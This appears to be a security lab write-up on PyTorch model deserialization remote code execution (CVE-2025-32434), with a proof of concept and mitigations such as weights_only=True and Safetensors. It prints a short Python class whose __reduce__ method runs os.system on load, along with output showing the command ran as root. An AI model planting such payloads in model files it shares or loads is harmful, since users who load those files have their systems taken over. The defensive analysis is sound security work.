# ML Model Deserialization RCE — Attack Chain Analysis (CVE-2025-32434)

> **PoC reproduction + attack/defense closed-loop verification**: craft a malicious model file (.pt/.pkl) that triggers arbitrary code execution via pickle deserialization on load, then demonstrate how `weights_only=True` blocks it. Runs fully inside an isolated container with harmless commands.
> **Version**: v1.0 · Attack surface: ML Model Supply Chain

---

## 0. Summary

**Root cause**: PyTorch's `torch.load()` uses pickle deserialization under the hood. When loading a model file (`.pt`/`.pkl`/HuggingFace weights) from an untrusted source, if the file embeds a malicious `__reduce__` object, the deserialization **runs arbitrary commands automatically at load time** — the most critical landing point in model supply-chain attacks (loading a model = running arbitrary code).

**Verified in this PoC**:
- A **97-byte** malicious `.pt` file → on load triggers `os.system` → command execution
- The same file loaded with `weights_only=True` → **RCE successfully blocked**

---

## 1. Vulnerability Info

| Item | Value |
|------|-------|
| Vuln | PyTorch torch.load deserialization RCE |
| CVE | **CVE-2025-32434** (public in NVD / SentinelOne) |
| Trigger | default unsafe deserialization in `torch.load()` |
| Impact | loading a malicious model → arbitrary code execution |
| Related | inherent risk class of Python `pickle` on untrusted input (lmdeploy, etc.) |

---

## 2. Attack Principle & Exploit Chain

### 2.1 Core mechanism: pickle's `__reduce__` hook

When pickle deserializes an object that implements `__reduce__`, it **automatically invokes the returned `(function, args)`**. An attacker uses this to have `__reduce__` return `os.system(command)`:

```python
class Exploit:
    def __reduce__(self):
        return (os.system, ('touch /tmp/rce_demo',))
```

- `pickle.dumps(Exploit())` → malicious binary file (disguised as a `.pt` model)
- Victim `torch.load()` → pickle parses → hits `__reduce__` → `os.system('touch /tmp/rce_demo')` **executes immediately**

### 2.2 Exploit chain

```
Attacker                        Victim
  │  build malicious .pt file     │
  │  __reduce__→os.system(cmd)    │
  │  ──────────────────►  download/load model
  │          malicious .pt        │ torch.load("model.pt")
  │                               │  └→ pickle deserialization
  │                               │       └→ __reduce__ fires
  │                               │            └→ os.system(cmd) ← RCE!
```

### 2.3 Real-world attack scenarios

- **HuggingFace weight poisoning**: `.bin`/`.safetensors` in a model repo, or the loading code, is poisoned
- **Shared/downloaded model files**: a developer `torch.load()`s an untrusted model
- **Model conversion/toolchain**: a script unserializes third-party models without defense
- **CI/CD supply chain**: a training/eval pipeline loads a poisoned model

---

## 3. PoC Verification Results

### 3.1 Environment (fully isolated)
- Container: `redteam-attacker` (python3.12-slim, isolated network `lab_internal`)
- Harmless commands: `touch /tmp/rce_demo` + `id`
- No network, no reverse shell, no system changes

### 3.2 Attack succeeds (unsafe load)

```
[+] malicious file generated: malicious_model.pt (97 bytes)
[*] loading: malicious_model.pt
uid=0(root) gid=0(root) groups=0(root)
RCE_TRIGGERED_BY_PICKLE
[✔] RCE triggered: /tmp/rce_demo created
    → proof: loading an untrusted pickle file = arbitrary code execution
```

### 3.3 Defense effective (weights_only=True)

```
[-] safe load: torch.load(weights_only=True)
[✔] attack blocked: [BLOCKED] refused: posix.system (weights_only forbids arbitrary classes)
    RCE check: /tmp/rce_demo exists = False  ← not executed
```

**Attack vs. defense**: the same malicious file → unsafe load triggers RCE / safe load blocks it.

---

## 4. Mitigations (by priority)

| # | Measure | Note |
|---|---------|------|
| 1 | Use `weights_only=True` | Official PyTorch fix; rejects arbitrary classes by default. **First choice** |
| 2 | Never `pickle`-load untrusted data | Core principle: don't give pickle untrusted input |
| 3 | Use safe model formats | Safetensors (tensor-only, no code execution) over pickle-based |
| 4 | Verify model source/signature | HuggingFace repo allowlist, checksum, source audit |
| 5 | Run with least privilege | Load/train process as low-privilege user, containerized |

> **Core principle (consistent with Agent security)**: distrust input formats, enforce privileges at the boundary.

---

## 5. Limitations (honest statement)

- This PoC reproduces a **known public mechanism** (CVE-2025-32434), not a 0-day
- Reproduced with pure pickle on `python3.12-slim`; PyTorch not actually installed (mechanism identical — torch.load is pickle underneath)
- Harmless commands serve as proof only; a real attack would use reverse shell / download-execute
- Verification covers the two core points: RCE trigger + weights_only blocking

---

## 6. Connection to Author's Background (technical migration narrative)

- **GPU kernel UAF exploitation** (Mate60 root) — exploiting execution control after memory is freed
- **This PoC** — exploiting execution control at deserialization/load time
- **Common ground**: identify the "trust-boundary timing window" (after free / at load), craft a trigger point to take an execution primitive
- **Differentiation**: from kernel-memory exploitation → model-file/data-plane exploitation, the same "find trigger → craft exploit → control execution" methodology

---

## 7. Files

| File | Purpose |
|------|---------|
| `redteam/scripts/poc_build_malicious.py` | Build the malicious .pt/.pkl file |
| `redteam/scripts/poc_victim_load.py` | Simulate a victim's unsafe load; verify RCE |
| `redteam/scripts/poc_defense_weightsonly.py` | Demonstrate weights_only=True defense blocking RCE |

---

*All tests ran in a fully isolated Docker container with harmless commands; data is for demonstration.*
